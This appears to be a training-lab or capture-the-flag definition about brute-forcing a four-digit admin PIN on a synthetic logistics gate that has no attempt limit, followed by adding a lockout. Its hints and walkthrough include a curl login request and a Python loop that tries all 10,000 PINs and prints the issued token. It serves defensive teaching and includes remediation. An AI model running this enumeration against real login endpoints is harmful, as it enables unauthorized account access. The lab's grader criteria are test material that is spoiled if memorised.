title: Four Digits
subtitle: Enumerate an unprotected admin PIN at Meridian Logistics
summary: Meridian's admin gate accepts a four-digit PIN with no attempt limit. Recover it, read the operations dashboard, then make guessing impractical.
scenario: The Meridian operations gate is meant for after-hours use. There is no attempt limit and no alerting, so a short numeric PIN is the only control. Automate the search, then add a lockout you can defend.
learningObjectives: Understand why short secrets without limits fail
Design and verify a lockout control
authorizedScope: Only the Meridian training gate in this session. The PIN and dashboard are synthetic.
riskSummary: Unlimited attempts reduce a four-digit PIN to a few thousand requests. Real attacks distribute this across hosts, so volume alone is not a reliable signal.
remediation: Lock or slow accounts after a small number of failures, prefer long passphrases or hardware keys, alert on distributed failures, and never use short numeric secrets for admin access.
conclusion: You enumerated a four-digit admin PIN, reached the operations dashboard, and then introduced a lockout that stops further guessing.

objectives.title: Recover the PIN and read the dashboard
objectives.description: Enumerate the four-digit PIN, use the issued admin session to read /api/admin/dashboard and submit the marker.

hints.text: `curl -s -X POST -H 'content-type: application/json' -d '{"pin":"0000"}' $CF_TARGET_URL/api/admin/login` shows the response shape.
Loop the whole 0000-9999 space with python3 requests or curl; stop on the first 200 and read the token.

objectives.title: Enforce a lockout
objectives.description: Apply a lockout policy. The live check sends repeated wrong PINs, expects a 429, and confirms the correct PIN is also blocked while locked.

criteria: correct PIN also blocked during lockout

walkthrough.title: Probe the gate
walkthrough.body: Send one wrong PIN and observe that the response counts failures without ever locking.
walkthrough.snippet: for i in 1 2 3; do curl -s -o /dev/null -w '%{http_code}\n' -X POST -H 'content-type: application/json' -d '{"pin":"0000"}' $CF_TARGET_URL/api/admin/login; done

walkthrough.title: Find the PIN
walkthrough.body: Enumerate the space and stop at the first success.
walkthrough.snippet:
python3 - <<'PY'
import json,urllib.request
for pin in range(10000):
    req=urllib.request.Request('http://127.0.0.1:8080/api/admin/login',data=json.dumps({'pin':f'{pin:04d}'}).encode(),headers={'content-type':'application/json'})
    try:
        body=json.load(urllib.request.urlopen(req))
        print(pin, body['token']); break
    except Exception: pass
PY

walkthrough.title: Gate the door
walkthrough.body: Add a lockout and confirm failures stop.
